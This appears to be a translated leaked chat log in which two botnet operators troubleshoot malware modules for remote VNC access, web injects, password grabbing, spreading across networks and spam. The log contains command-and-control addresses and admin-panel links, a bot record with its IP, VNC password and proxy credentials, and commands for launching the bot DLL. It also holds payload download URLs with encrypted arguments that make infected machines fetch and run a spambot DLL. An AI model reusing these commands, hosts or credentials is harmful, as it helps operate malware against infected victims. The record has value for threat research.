+[25.08.21 07:46:51] cesar: contacting adam, looks like a gasket
+[25.08.21 07:47:02] angelo: got it ((
+[25.08.21 12:48:34] angelo: help
+[25.08.21 12:48:43] angelo: i can't talk to def
+[25.08.21 12:49:10] angelo: [05:33:43] <defender@> what exactly is not working?
+[05:33:52] <azot> injections via VNC
+[05:34:00] <azot> inject module
+[05:34:13] <azot> no data going into panel
+[05:34:15] <azot> to Zeus
+[05:34:21] <defender@> but why do you need pink?
+[05:34:31] <azot> ok, how to run vntz ?!
+[05:35:19] <azot> in black I run the module directly, in pink I get access by pressing Get, is it not so ?!
+[05:35:23] <defender@> press start on any one and see what command will be in black
+[05:35:32] <defender@> so
+[05:36:13] <azot> that means I can give vntz command in black admin ?
+[05:37:06] <azot> write the command
+[25.08.21 12:49:23] angelo: so how to give vntz access
+[25.08.21 12:56:12] angelo: maybe there is a command for vnts to start except start ?
+[25.08.21 13:21:11] angelo: vnc3Dll start 63
+[25.08.21 13:21:12] angelo: is it for new vnc ?
+[25.08.21 14:56:45] cesar: 62 vnc3Dll start
+[25.08.21 14:58:23] cesar: hammer writes - There's no bot comes to life after reboot
+[25.08.21 14:58:32] cesar: what's the problem?
+[25.08.21 15:58:48] angelo: there is a problem
+[25.08.21 15:58:50] angelo: both me and Hymie
+[25.08.21 15:59:13] angelo: I had no errors
+[25.08.21 15:59:20] angelo: chaimi got an error on overload
+[25.08.21 15:59:28] angelo: module not found
+[25.08.21 15:59:29] angelo: DLRAN
+[25.08.21 15:59:42] angelo: AB off
+[25.08.21 15:59:52] angelo: bot zev4
+[25.08.21 15:59:57] angelo: took from panel today
+[25.08.21 16:54:30] cesar: how long did the bot work for him?
+[25.08.21 16:54:43] cesar: maybe not had time to copy
+[25.08.21 16:54:50] cesar: it took a while
+[25.08.21 16:55:00] angelo: exactly one hour
+[25.08.21 16:55:06] angelo: I got more
+[25.08.21 16:55:14] angelo: bots were working.
+[25.08.21 16:55:24] angelo: that means the admins were watching the activity
+[25.08.21 16:55:29] cesar: and knocked on admin?
+[25.08.21 16:55:30] angelo: and then they found out they were dead
+[25.08.21 16:55:35] angelo: knocked
+[25.08.21 16:55:43] angelo: after overloading everything
+[25.08.21 16:55:49] angelo: remembered
+[25.08.21 16:55:51] cesar: on 10?
+[25.08.21 16:55:55] angelo: yes
+[25.08.21 16:56:01] angelo: jaum4
+[25.08.21 16:56:04] angelo: zev4
+[25.08.21 16:56:09] cesar: ok, I'll check
+[25.08.21 16:56:21] cesar: did you take crypto?
+[25.08.21 16:56:25] angelo: two bots, not one, almost a statistic
+[25.08.21 16:56:28] angelo: yes
+[25.08.21 16:56:33] angelo: from the panel
+[25.08.21 16:56:34] angelo: sam
+[25.08.21 16:56:46] angelo: zev4AdeHcvJ.dll
+[25.08.21 16:56:53] cesar: ok
+[25.08.21 17:18:31] cesar: how did you run the dll?
+[25.08.21 17:18:31] cesar: and how did you run the dll?
+[25.08.21 17:18:32] cesar: and what command did you run the dll with?
+[25.08.21 17:18:32] cesar: and what command did you run the dll with?
+[25.08.21 17:18:32] cesar: and what command did you run the dll with?
+[25.08.21 17:27:09] angelo: regsvr32 zev4AdeHcvJ.dll
+[25.08.21 17:27:16] angelo: I don't see first message
+[25.08.21 17:27:19] angelo: bro
+[25.08.21 18:00:05] cesar: but you need regsvr32 c:\path\pathzev4AdeHcvJ.dll
+[25.08.21 18:00:54] angelo: I don't get it now.
+[25.08.21 18:01:16] angelo: what does it matter where the file location is ?
+[25.08.21 18:01:21] angelo: to run
+[25.08.21 18:01:45] angelo: I'm running from the folder with the bot
+[25.08.21 18:02:03] cesar: it's important
+[25.08.21 18:02:17] cesar: try running it that way and everything will work
+[25.08.21 18:02:38] angelo: wait
+[25.08.21 18:02:46] angelo: don't get it
+[25.08.21 18:02:53] angelo: i need to create a folder path ?
+[25.08.21 18:02:58] cesar: no
+[25.08.21 18:02:59] angelo: put bot there and run ?
+[25.08.21 18:03:06] cesar: specify full path to the file
+[25.08.21 18:03:16] cesar: not just the name
+[25.08.21 18:03:16] angelo: aaaaah
+[25.08.21 18:03:22] cesar: exactly the full path
+[25.08.21 18:03:25] angelo: first time I heard
+[25.08.21 18:03:31] angelo: nobody said
+[25.08.21 18:03:39] angelo: the same Manuel lets in the same way
+[25.08.21 18:04:09] cesar: told all testers
+[25.08.21 18:04:42] cesar: the same with rundll32
+[25.08.21 18:06:03] angelo: ok
+[25.08.21 18:06:54] angelo: check it out
+[25.08.21 18:32:30] angelo: tsez help with vntz a
+[25.08.21 18:32:50] cesar: ?
+[25.08.21 18:33:11] angelo: we started the vntz module
+[25.08.21 18:33:15] angelo: what's next
+[25.08.21 18:33:18] angelo: there is a list
+[25.08.21 18:33:24] angelo: how to search there
+[25.08.21 18:33:37] cesar: what's your task?
+[25.08.21 18:33:49] angelo: go to vntz's car)
+[25.08.21 18:33:54] angelo: everything is trivial
+[25.08.21 18:34:04] angelo: http://195.123.212.155:8081/api/online/get
+[25.08.21 18:34:12] angelo: there's this B*** list
+[25.08.21 18:34:19] angelo: but how to look for the bot there ?
+[25.08.21 18:34:59] cesar: by botid for example
+[25.08.21 18:35:26] cesar: ah, they gave you the old list
+[25.08.21 18:35:31] angelo: no
+[25.08.21 18:35:34] angelo: it's new
+[25.08.21 18:35:38] cesar: the new one is at a different address
+[25.08.21 18:35:40] angelo: grem said
+[25.08.21 18:35:43] angelo: eep
+[25.08.21 18:35:46] angelo: any ?
+[25.08.21 18:35:58] cesar: http://195.123.212.155:9091/api/online/list
+[25.08.21 18:36:26] cesar: or
+[25.08.21 18:36:33] cesar: http://195.123.212.155:9091/api/online/get
+[25.08.21 18:38:06] angelo: and there's no such thing
+[25.08.21 18:38:36] cesar: what module did you run?
+[25.08.21 18:38:49] cesar: vnc3Dll ?
+[25.08.21 18:39:08] angelo: yes
+[25.08.21 18:39:15] angelo: went to the repository
+[25.08.21 18:39:15] angelo: and
+[25.08.21 18:39:30] angelo: Error
+Server give answer, but does not send VNC params. Close dialog and try again.
+[25.08.21 18:40:05] cesar: so, what does it mean?
+[25.08.21 18:40:26] angelo: well, it's sending get
+[25.08.21 18:40:31] angelo: this is bullshit
+[25.08.21 18:40:38] angelo: it's not in the list
+[25.08.21 18:41:27] cesar: did you run the module through black admin?
+[25.08.21 18:41:56] angelo: yes
+[25.08.21 18:42:32] cesar: give me the bot id, did the module run there?
+[25.08.21 18:42:43] angelo: i think so.
+[25.08.21 18:43:02] angelo: 70BB343FD97E3B4711D1BB6A13D5A374
+[25.08.21 18:43:38] cesar: bot is a test bot?
+[25.08.21 18:44:01] angelo: yes
+[25.08.21 18:44:11] cesar: is this machine working now?
+[25.08.21 18:44:18] angelo: yes
+[25.08.21 18:44:30] cesar: what group?
+[25.08.21 18:44:39] angelo: tst31
+[25.08.21 18:45:30] cesar: DESKTOP-U81TONL_W10019042.70BB343FD97E3B4711D1BB6A13D5A374
+[25.08.21 18:45:55] cesar: "botid": "DESKTOP-U81TONL_W10019042.70BB343FD97E3B4711D1BB6A13D5A374",
+			{ "group": "tst31",
+			"hash_id": "3054445754",
+			"hash_gr": 2633035604,
+			"con_time": 1629916909,
+			"last_time": 1629917090,
+			"ip": "96.31.67.12",
+			"vnc_pass": "uiQPtlTv",
+			"socks_auth": "9CF0EF54:B60F24BA"
+[25.08.21 18:46:15] angelo: how ?
+[25.08.21 18:46:17] angelo: where ?
+[25.08.21 18:46:22] angelo: where are you looking at it ?
+[25.08.21 18:46:33] cesar: at get
+[25.08.21 18:46:37] cesar: uiQPtlTv|DESKTOP-U81TONL_W10019042.70BB343FD97E3B4711D1BB6A13D5A374|96.31.67.12|VNC:195.123.212.212.155:9093:uiQPtlTv|Socks:195.123.212.155:9092:9CF0EF54:B60F24BA|Country: United States Region: North America City: N/A,
+[25.08.21 18:46:47] cesar: and this is on the sheet
+[25.08.21 18:47:13] cesar: may have recently appeared
+[25.08.21 18:47:24] angelo: yes
+[25.08.21 18:47:26] angelo: recently
+[25.08.21 18:47:28] cesar: searched by your id - didn't find it either
+[25.08.21 18:47:28] angelo: apparently
+[25.08.21 18:47:31] angelo: long time
+[25.08.21 18:59:33] angelo: thanks
+[26.08.21 07:44:59] angelo: hi
+[26.08.21 07:45:05] angelo: watch bot 043EFB309D1FBB31D7BB8EFB36F4BFA3
+[26.08.21 07:45:38] angelo: I give the command
+63 vnc3Dll start
+[26.08.21 07:45:45] angelo: and it disappears from the list
+[26.08.21 07:45:55] angelo: if anything I see that I start network a second time
+[26.08.21 07:46:12] cesar: hi
+[26.08.21 07:46:32] cesar: admin 3 ?
+[26.08.21 07:46:32] angelo: tried and failed yesterday
+[26.08.21 07:46:42] angelo: kwwka7a
+[26.08.21 07:46:48] angelo: I don't know the number
+[26.08.21 07:47:15] cesar: okay.
+[26.08.21 07:47:39] cesar: this is the 2nd
+[26.08.21 07:48:13] cesar: 62
+[26.08.21 07:48:21] cesar: team 62
+[26.08.21 07:48:26] cesar: 63 no
+[26.08.21 07:48:31] cesar: !!!
+[26.08.21 07:49:26] cesar: what are you smoking there, sir? )))
+[26.08.21 07:52:40] angelo: sir, but yesterday 63 was working
+[26.08.21 07:53:10] angelo: and i saw the command to run 63
+[26.08.21 07:54:02] cesar: 63 is the command from the bot, result
+[26.08.21 07:54:32] angelo: ouch
+[26.08.21 07:54:38] angelo: sorry
+[26.08.21 07:54:51] Cesar: It's okay.
+[26.08.21 07:55:06] angelo: I never introduced myself as a genius.)
+[26.08.21 07:55:19] cesar: come on!)
+[26.08.21 08:16:24] angelo: how to remove bot from black ?
+[26.08.21 08:16:29] angelo: we had a bop down there
+[26.08.21 08:16:34] angelo: would like to remove
+[26.08.21 08:16:58] angelo: button Share at the bottom where the button on the commands ?
+[26.08.21 08:19:34] angelo: 71F589B3A3BDB3FF479B9CBB34FF7527 can you remove ?
+[26.08.21 08:22:09] cesar: you mean delete the bot?
+[26.08.21 08:22:31] cesar: you can delete the bot on the machine
+[26.08.21 08:22:45] cesar: in admin area to remove from stats you need to write to admin
+[26.08.21 08:22:51] cesar: adam
+[26.08.21 08:31:45] angelo: oh, boy
+[26.08.21 08:31:51] angelo: got it
+[26.08.21 16:16:09] angelo: hello again
+[26.08.21 16:16:18] angelo: you didn't upload what heimi uploaded?
+[26.08.21 16:17:12] cesar: didn't download it right away, then fell out of the chat room
+[26.08.21 16:17:23] cesar: and I don't see the message anymore
+[26.08.21 16:17:38] cesar: wrote him to repeat it
+[26.08.21 16:18:35] angelo: ok
+[30.08.21 09:45:11] angelo: hi!
+[30.08.21 09:45:30] angelo: can you disable automatic startup on group 31 ?
+[30.08.21 09:45:30] angelo: tst31
+[30.08.21 10:21:42] cesar: hi, it's for adam
+[30.08.21 10:22:03] cesar: I can make a bot that runs modules on command 61
+[30.08.21 10:22:17] cesar: it would then ignore commands from the admin panel
+[30.08.21 10:22:28] angelo: would it be hard ?
+[30.08.21 10:22:35] cesar: In 15 minutes
+[30.08.21 10:22:40] angelo: no burning
+[30.08.21 10:22:42] angelo: thanks
+[30.08.21 10:23:01] cesar: don't put pwgrab in autostart too?
+[30.08.21 10:29:59] angelo: no
+[30.08.21 10:30:00] angelo: nothing
+[30.08.21 10:30:08] angelo: we don't need it for inject test
+[30.08.21 10:30:49] cesar: ok
+[31.08.21 08:38:07] angelo: Hi.
+[31.08.21 08:38:12] angelo: you need to upload a release to the injector
+[31.08.21 08:38:17] cesar: hi
+[31.08.21 08:38:25] cesar: upload
+[31.08.21 08:38:25] angelo: transfer back
+[31.08.21 08:38:30] angelo: from tinderbox to injet
+[31.08.21 08:38:32] cesar: yesterday?
+[31.08.21 08:38:34] angelo: yeah
+[31.08.21 08:38:36] cesar: okay
+[31.08.21 08:38:43] cesar: 64-bit only
+[31.08.21 08:38:47] cesar: I'll fill it in
+[31.08.21 08:38:51] angelo: ok
+[31.08.21 08:53:36] cesar: filled
+[31.08.21 08:53:40] cesar: on both admins
+[31.08.21 08:58:29] angelo: Uh-huh.
+[31.08.21 08:58:32] angelo: thanks!
+[02.09.21 09:01:47] angelo: hello
+[02.09.21 09:01:50] angelo: what about cceqv5
+[02.09.21 09:02:41] cesar: hi
+[02.09.21 09:04:28] cesar: I'll write to def, the link is unavailable
+[02.09.21 09:09:01] angelo: ok.
+[02.09.21 09:16:07] cesar: repeat it please
+[02.09.21 09:16:17] cesar: dropped out
+[02.09.21 09:23:25] angelo: not out the window, bro.
+[02.09.21 09:24:03] angelo: did you get a new vntz ?
+[02.09.21 09:24:06] angelo: corrected
+[02.09.21 09:30:02] cesar: it's already uploaded into production
+[02.09.21 12:32:33] angelo: you can check it out
+[02.09.21 12:32:34] angelo: 69F371F799F2833B6FB974F5FF9B31D1
+[02.09.21 12:32:39] angelo: did i download vntz or not ?!
+[02.09.21 13:01:57] angelo: that's bullshit
+[02.09.21 13:09:53] cesar: sec
+[02.09.21 13:12:17] cesar: no, I couldn't
+[02.09.21 13:12:18] cesar: 10 Download failed
+[02.09.21 13:12:31] cesar: run it again
+[02.09.21 13:15:21] angelo: first time such error
+[02.09.21 13:15:25] angelo: everything okay on the server ?
+[02.09.21 13:15:34] angelo: because we need to check the inject from outside
+[02.09.21 13:16:26] angelo: even admin takes a long time
+[02.09.21 13:19:07] cesar: probably bad gaskets on the modules, I'll write to adam
+[02.09.21 13:34:41] angelo: and what do you think, exactly at the module ?
+[02.09.21 13:34:49] angelo: or on another admin try ?
+[02.09.21 13:36:43] cesar: on another will work
+[02.09.21 14:04:02] angelo: yeah, okay
+[02.09.21 14:04:05] angelo: thanks
+[03.09.21 07:27:52] angelo: hello!
+[03.09.21 07:28:01] cesar: hi
+[03.09.21 07:28:10] angelo: yesterday I was running Hymie bot on 7
+[03.09.21 07:28:17] angelo: how do you like the list of folders on vm
+[03.09.21 07:28:32] angelo: (1:21:04 PM) flip: 09/02/2021 05:27 PM <DIR> .
+09/02/2021 05:27 PM <DIR> .
+09/02/2021 05:27 PM 475,008 injectDll64
+09/02/2021 05:01 PM 29,520 networkDll64
+09/02/2021 05:26 PM 771,952 pwgrabb64
+09/02/2021 05:25 PM 513,392 pwgrabc64
+09/02/2021 04:58 PM 17,120 shareDll64
+09/02/2021 05:00 PM 734,560 tabDll64
+09/02/2021 04:58 PM 239,440 vnc3Dll64
+[03.09.21 07:29:12] angelo: this is from Hammer:
+[03.09.21 07:29:17] angelo: ``need to write to caesar. that there fresh bots are dying, apparently because of the macaffi detector, tov recheck and clean it up, and it's not there''
+[03.09.21 07:29:18] cesar: yes, 7 has it
+[03.09.21 07:29:36] cesar: ok, macafee check
+[17.09.21 15:01:28] angelo: Hi !
+[17.09.21 15:01:36] angelo: can I remove autoloading in one bot ?
+[17.09.21 15:01:47] angelo: started the bot now
+[17.09.21 15:04:59] cesar: hi
+[17.09.21 15:05:20] cesar: tell me what you need
+[17.09.21 15:05:26] cesar: and for what
+[17.09.21 15:05:34] angelo: we launched one bot
+[17.09.21 15:05:37] angelo: Xev
+[17.09.21 15:05:42] angelo: for test
+[17.09.21 15:05:49] angelo: and he will be receiving launch commands
+[17.09.21 15:06:20] cesar: so, for the test what did you run?
+[17.09.21 15:06:20] angelo: 1876173BF733F7FF33B773B773BFFB7F
+[17.09.21 15:06:25] angelo: shit, it's starting to happen!)
+[17.09.21 15:06:35] angelo: vnts + inject
+[17.09.21 15:07:06] cesar: as an option, I can make a test one, which modules you will run manually from the black admin panel
+[17.09.21 15:07:11] cesar: via command 61
+[17.09.21 15:07:33] angelo: yes, we already ran the bot (
+[17.09.21 15:07:41] angelo: wormDll 2021-09-17 15:06:02.589986 infect
+shareDll 2021-09-17 15:05:43.421521 infect
+tabDll
+[17.09.21 15:07:46] angelo: how to get it out ?
+[17.09.21 15:07:51] angelo: name + release ?
+[17.09.21 15:07:56] cesar: they upload by themselves
+[17.09.21 15:08:37] angelo: wow, I thought they were the same modules as vntz or import or network
+[17.09.21 15:09:29] cesar: no, they work and unload
+[17.09.21 15:11:35] angelo: what kind of modules are they ?
+[17.09.21 15:11:35] angelo: if you don't mind
+[17.09.21 15:11:47] angelo: wormDll
+shareDll
+tabDll
+[17.09.21 15:15:50] cesar: reproduction
+[17.09.21 15:16:10] cesar: via grid, etc.
+[20.09.21 10:15:14] angelo: Hail bro !
+[20.09.21 10:15:20] angelo: can you throw a test bot ?
+[20.09.21 10:15:27] angelo: 31 it seemed
+[20.09.21 10:15:32] angelo: can't find it
+[20.09.21 10:15:39] cesar: hi.
+[20.09.21 10:16:02] cesar: on the 3rd admin, without loading modules, run through 61 ?
+[20.09.21 10:16:25] angelo: all right, but what is the 3rd admin ?
+[20.09.21 10:16:41] angelo: i have this cceqv5
+[20.09.21 10:16:57] angelo: and this kwka7
+[20.09.21 10:17:00] angelo: no others
+[20.09.21 10:18:10] cesar: well, which one to test?
+[20.09.21 10:18:19] cesar: kwwka7 - 2nd
+[20.09.21 10:18:21] angelo: cceqv5
+[20.09.21 10:18:27] cesar: cceqv5 - 3rd
+[20.09.21 10:18:30] cesar: ok
+[20.09.21 10:18:39] angelo: I'll keep it in mind !
+[20.09.21 10:34:04] cesar: vAv2z71Nsb3Vwu6rHVc3rdrxd5
+Download: https://qaz.im/load/erQ6tn/yb4i4d
+Delete: https://qaz.im/index.php?a=delete&q=1416247485
+[20.09.21 10:35:37] angelo: password doesn't fit
+[20.09.21 10:44:18] cesar: sec
+[20.09.21 10:44:58] cesar: vAv2z71Nsb3Vwu6rHVc3rdrxd5
+[20.09.21 10:45:06] cesar: check last space
+[20.09.21 10:45:12] cesar: it shouldn't be
+[20.09.21 10:45:37] angelo: nope
+[20.09.21 10:45:48] angelo: but you do ?
+[20.09.21 10:47:18] cesar: yes
+[20.09.21 10:47:51] angelo: throw `tac.
+[20.09.21 10:48:29] cesar: `vAv2z71Nsb3Vwu6rHVc3rdrxd5`
+[20.09.21 10:49:01] angelo: ok ok
+[20.09.21 10:49:02] angelo: thanks bro !
+[20.09.21 15:13:19] angelo: bin is an exe ?
+[20.09.21 15:15:11] angelo: bot didn't wake up
+[20.09.21 16:40:45] cesar: still not awake?
+[20.09.21 16:41:03] angelo: no
+[20.09.21 16:41:07] angelo: found old test one
+[20.09.21 16:41:13] angelo: dug up 31 groups
+[20.09.21 16:41:54] cesar: and it worked?
+[20.09.21 16:41:58] cesar: and this did not?
+[20.09.21 16:42:05] cesar: and this one didn't?
+[20.09.21 16:42:12] angelo: yeah
+[20.09.21 16:42:14] angelo: the old one's fine
+[20.09.21 16:42:18] angelo: didn't mean it
+[20.09.21 16:43:39] cesar: strange, maybe you searched wrong band?
+[20.09.21 16:43:49] angelo: that one
+[20.09.21 16:43:52] angelo: and by ipu
+[20.09.21 16:43:55] angelo: and group
+[20.09.21 16:44:01] angelo: cceqv5
+[20.09.21 16:44:03] angelo: searched no
+[20.09.21 16:44:09] angelo: and bot was on task
+[20.09.21 16:44:17] angelo: all the time when running heimi said
+[20.09.21 16:44:31] cesar: strange, I'll check
+[20.09.21 16:44:59] angelo: no lie, honestly
+[21.09.21 10:58:59] angelo: Hi !
+[21.09.21 10:59:12] cesar: hi.
+[21.09.21 10:59:13] angelo: I understand correctly, to run a dll via Trick. You need
+[21.09.21 10:59:25] angelo: start a network module and catch the bot in the vault ?
+[21.09.21 10:59:32] cesar: from memory?
+[21.09.21 10:59:41] angelo: yeah
+[21.09.21 10:59:41] cesar: there are 2 options
+[21.09.21 10:59:43] angelo: from computer
+[21.09.21 10:59:49] angelo: which one is easier
+[21.09.21 10:59:58] cesar: easier from disk
+[21.09.21 11:00:06] angelo: which method ?
+[21.09.21 11:00:34] cesar: from pink admin area you can run dll only from disk
+[21.09.21 11:00:52] angelo: but from black admin you can run the dll from disk 0_0
+[21.09.21 11:00:58] cesar: yes
+[21.09.21 11:01:06] cesar: and from memory
+[21.09.21 11:01:16] angelo: you can show me how to black from disk
+[21.09.21 11:01:59] cesar: 1) upload a dll to ftp or server so you have a link to the dll
+[21.09.21 11:02:20] cesar: 2) send me or def for encryption
+[21.09.21 11:02:42] angelo: oops.
+[21.09.21 11:02:43] cesar: 3) and the function in the dll to be called
+[21.09.21 11:02:51] angelo: ouch
+[21.09.21 11:02:58] cesar: I'm throwing in a string to run
+[9/21/221 11:03:11] angelo: I was thinking like in anchor, you can load a dll by hand and just run
+[21.09.21 11:03:34] angelo: the same method in pink ?
+[21.09.21 11:04:06] cesar: yes, you just have to specify the link in the arguments and the call function, it's encrypted automatically
+[21.09.21 11:05:04] angelo: so, a little bit understand, is there an example where you can add a dll ?
+[21.09.21 11:05:14] angelo: I haven't done that
+[21.09.21 11:06:02] cesar: you mean you have nowhere to put the test dll?
+[21.09.21 11:06:13] angelo: nope
+[21.09.21 11:06:23] angelo: I didn't upload to links...
+[21.09.21 11:06:28] angelo: a couple of times long time ago
+[21.09.21 11:06:40] cesar: what kind of dll?
+[21.09.21 11:06:48] angelo: spambot
+[21.09.21 11:06:53] angelo: basil wrote you
+[21.09.21 11:07:07] cesar: you have to run it from memory
+[21.09.21 11:07:19] cesar: throw down the dll, is it 64 bits?
+[21.09.21 11:07:34] angelo: 86
+[21.09.21 11:07:47] cesar: I wrote that you need 2 bits
+[21.09.21 11:07:53] cesar: him
+[21.09.21 11:07:59] angelo: hmm
+[21.09.21 11:08:00] angelo: ok
+[21.09.21 11:08:03] cesar: you're gonna test it on 64-bit?
+[21.09.21 11:08:15] angelo: yes, and i remembered
+[21.09.21 11:08:24] angelo: it won't boot 32 on 64 vin
+[21.09.21 11:08:32] cesar: yes
+[9/21/221 11:10:57] angelo: can 85 be loaded only ? for now, I'll fix 32 bit windup
+[21.09.21 11:11:02] angelo: 86 )
+[21.09.21 11:38:47] cesar: yes
+[21.09.21 11:42:20] angelo: hJLHUILSYIujd8262t20[^@T72d3
+[21.09.21 11:42:20] angelo: https://send.exploit.in/download/369d452dafe48399/#ZUzZyhcJ6gdYDwdN6Lmfhw
+[21.09.21 12:35:05] angelo: Husly87t2l898y&;82gubjldsf
+[21.09.21 12:35:33] angelo: https://send.exploit.in/download/c0e99026769228da/#77qcT3xgJZvFh8B4RYZNsg
+[21.09.21 12:35:42] angelo: this is 64 spambot dll
+[21.09.21 12:35:51] cesar: ok
+[21.09.21 12:36:17] angelo: we need to test 64
+[21.09.21 12:37:30] cesar: upload it soon
+[21.09.21 12:44:53] angelo: you just know I'm standing on the sidelines here....
+[21.09.21 12:59:03] cesar: http://5.181.80.155/images/mlb32.dll
+http://5.181.80.155/images/mlb64.dll
+[21.09.21 12:59:27] cesar: I'm about to upload an encrypted 64
+[21.09.21 12:59:34] angelo: ok
+[21.09.21 13:00:18] cesar:		AAAAAD2tpgACJaHuLGmeMV06LeYSoaaNi87iY4HsX9XCWYYyJAAAAGgAdAB0AHAAOgAvAC8ANQAuADEAOAAxAC4AOAAwAC4AMQA1ADUALwBpAG0AYQBnAGUAcwAvAG0AbABiADYANAAuAGQAbABsAMM+fWGF6MANRgJRmCUvbFE8C9vv/euUVCnI4H5uxfP4KdOFCegGRIUlu8eOx5SpUqB/mlxz4wltBXBEDbdH3v/WpdohP5rV79oGBb+XO3tszfVqxgc4dgE1Z8afrgl+rw==
+[21.09.21 13:00:38] angelo: throw the tap at me
+[21.09.21 13:00:44] angelo: what to do now?
+[21.09.21 13:01:11] cesar: a few minutes
+[21.09.21 13:02:55] cesar: enter command 45
+[21.09.21 13:03:00] cesar: argument
+[21.09.21 13:03:05] cesar:		AAAAAD2tpgACJaHuLGmeMV06LeYSoaaNi87iY4HsX9XCWYYyJAAAAGgAdAB0AHAAOgAvAC8ANQAuADEAOAAxAC4AOAAwAC4AMQA1ADUALwBpAG0AYQBnAGUAcwAvAG0AbABiADYANAAuAGQAbABsAMM+fWGF6MANRgJRmCUvbFE8C9vv/euUVCnI4H5uxfP4KdOFCegGRIUlu8eOx5SpUqB/mlxz4wltBXBEDbdH3v/WpdohP5rV79oGBb+XO3tszfVqxgc4dgE1Z8afrgl+rw==
+[21.09.21 13:03:21] cesar: it's for 64 bit
+[21.09.21 13:03:28] angelo: shit
+[21.09.21 13:03:30] angelo: now
+[21.09.21 13:03:35] cesar: so the bot runs on a 64 bit machine
+[21.09.21 13:03:52] angelo: yeah
+[21.09.21 13:03:56] angelo: via Pushback ?
+[21.09.21 13:04:12] cesar: yes
+[21.09.21 13:04:23] angelo: I'm with cceqv5 admin
+[21.09.21 13:04:26] cesar: it's for 32 bit encrypted link
+[21.09.21 13:04:28] cesar: yes
+[21.09.21 13:04:32] cesar:		AAAAAPwfGAnmrfLr32VYFV/MkBYppG5SzVp57FnguaKyXjRxJAAAAGgAdAB0AHAAOgAvAC8ANQAuADEAOAAxAC4AOAAwAC4AMQA1ADUALwBpAG0AYQBnAGUAcwAvAG0AbABiADMAMgAuAGQAbABsAC7sFf7MqV17WtPDdYsZ9mNTzMT+Qp+limVb31YlmDvgGaFayQdRkUNW006fP/e/sTC8Exqb+D+vNeH67YrkviZT3p/YrtLglxBnnhkRbcUK1k+Sx30JeNzEiOalMOxDUA==
+[21.09.21 13:05:39] angelo: saved
+[21.09.21 13:06:44] angelo: gave the command
+[21.09.21 13:07:20] cesar: where does the log go did you check with basil?
+[21.09.21 13:07:35] cesar: there are logged versions of his dll
+[21.09.21 13:07:49] angelo: into the Temp...
+[21.09.21 13:08:40] angelo: so maybe I did something wrong
+[21.09.21 13:08:41] angelo: https://cceqv5ulg6fc44budf3a4s5kkrhprk5okjmdtgmo6xevj2p2sxnkh3id.onion/log/18766872
+[21.09.21 13:08:43] angelo: here's the bot
+[21.09.21 13:08:58] angelo: made Push Back
+[21.09.21 13:09:12] angelo: with command 45 and prescribed cipher parameter
+[21.09.21 13:09:40] cesar: all right
+[21.09.21 13:09:47] cesar: 10 okay
+[21.09.21 13:10:11] cesar: look for logs
+[21.09.21 13:10:12] angelo: got it, sorry bro, it's just the first time I do it
+[21.09.21 13:29:25] cesar: uploaded new 64 bit file
+[21.09.21 13:29:26] cesar:		AAAAAGGnrJaf70mtAt65vbgOSMpA8yHR67OC5j0u8mFs1OdtJAAAAGgAdAB0AHAAOgAvAC8ANQAuADEAOAAxAC4AOAAwAC4AMQA1ADUALwBpAG0AYQBnAGUAcwAvAG0AbABiADYANAAuAGQAbABsAEMs0C64VeyubWUi6sqt7+gZkKk9ByHjY4NVQNLl5SJJ9OQqkeOnhX9A/SEUMM5gDOp/h+ZxC15DoB2Cmg3SVAds3gFU87hU4ZhWRaMpVDPtCNcBNrs6qUPSSQ5yRqkHnQ==
+[21.09.21 13:29:31] cesar: new cipher link
+[21.09.21 13:30:31] angelo: nothing to do with that command ?
+[21.09.21 13:30:59] angelo: running
+[21.09.21 13:33:15] cesar: same command again
+[21.09.21 13:33:28] angelo: ok
+[21.09.21 13:35:05] angelo: all right
+[21.09.21 13:35:09] angelo: thanks !
+[21.09.21 13:53:45] angelo: can we fill it up without logging ?
+[21.09.21 15:12:07] cesar: went away, sorry
+[21.09.21 15:12:11] cesar: we can upload
+[21.09.21 15:12:30] cesar: 10 minutes
+[21.09.21 15:13:20] angelo: I'll do it myself
+[21.09.21 15:13:22] angelo: 15 minutes
+[21.09.21 15:39:03] cesar:		AAAAAGkiOc/+q6e4VqIhD6cFrKu8nHRq8bbA2CyiZo7fD5HdJAAAAGgAdAB0AHAAOgAvAC8ANQAuADEAOAAxAC4AOAAwAC4AMQA1ADUALwBpAG0AYQBnAGUAcwAvAG0AbABiADYANAAuAGQAbABsALc1JlP6DcQcNbzEE2lV+jecQ+hdjdIeMFePvXS7U7YBoCkraaeOo0IeXcVa47ve7UkvCe1kldvZx8PZVmUCzDLbTWS3uZ1hJ6ovaPY2PUxQUZFIfh38tS09pMHo59gjog==
+[22.09.21 12:02:02] angelo: hi !
+[22.09.21 12:02:03] angelo: tell me
+[22.09.21 12:02:09] angelo: can two modules be loaded ?
+[22.09.21 12:02:13] angelo: simultaneously
+[22.09.21 12:02:52] cesar: hello
+[22.09.21 12:03:22] cesar: it can, if let's say av killed the bot, and it started again and ran another module
+[22.09.21 12:03:49] angelo: and if you started the module and then autoloaded the module ?
+[22.09.21 12:05:22] cesar: 2 will not start
+[22.09.21 12:05:29] cesar: always one will unload
+[22.09.21 12:05:33] angelo: hmm
+[22.09.21 12:05:34] angelo: okay
+[22.09.21 12:05:36] angelo: thank you.
+[22.09.21 16:54:29] angelo: hi !
+[22.09.21 16:54:32] angelo: you're needed
+[22.09.21 16:54:33] angelo: like water
+[22.09.21 16:54:36] angelo: and air
+[22.09.21 17:13:09] cesar: what is it?
+[22.09.21 17:13:13] cesar: hi.
+[22.09.21 17:13:46] angelo: what's up?))
+[22.09.21 17:13:52] angelo: yeah, so far, so good.)
+[22.09.21 17:13:59] angelo: sorry
+[22.09.21 17:14:16] cesar: okay.)
+[22.09.21 17:14:36] angelo: "lucky" thought cesar.
+[22.09.21 17:14:37] angelo: =)
+[22.09.21 17:14:52] cesar: exactly so )))
+[23.09.21 11:27:49] angelo: hi !
+[23.09.21 11:27:57] angelo: still gotta fill in 32 not logged
+[23.09.21 11:37:24] angelo: can you see the bot ?
+[9/23/221 11:47:46] angelo: 312908 7 0 10 Start failed
+[9/23/221 11:47:48] angelo: no way ((
+[9/23/221 12:25:58] cesar: hi
+[23.09.21 12:42:06] angelo: hello
+[23.09.21 13:13:43] cesar: so what's the problem with the bot?
+[23.09.21 13:14:35] angelo: our yesterday's spambot32 is not loading
+[23.09.21 13:14:54] angelo: can you upload unlogged 32 ?
+[23.09.21 13:15:43] cesar: and the link works?
+[23.09.21 13:16:01] angelo: I don't know how to check
+[23.09.21 13:16:07] angelo: you threw me this yesterday
